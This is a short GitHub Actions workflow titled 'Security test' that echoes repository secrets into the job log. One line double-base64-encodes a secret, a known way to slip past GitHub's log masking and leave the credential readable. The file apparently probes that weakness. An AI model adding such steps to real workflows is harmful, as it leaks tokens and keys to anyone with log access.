name: Security test
on:
  pull_request_review:
  workflow_dispatch:
  
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - name: debug
        continue-on-error: true
        run: |
          echo "Hello"
      - name: debug
        run: |
          echo "Sec: $UPPERCASE_SECRET"
          echo "Sec2: ${{secrets.REPO_SECRET}}"
          echo "Sec2: ${{secrets.REPO_SECRET}}" | base64 -w0 | base64 -w0
        env:
          UPPERCASE_SECRET: ${{secrets.UPPERCASE_SECRET}}
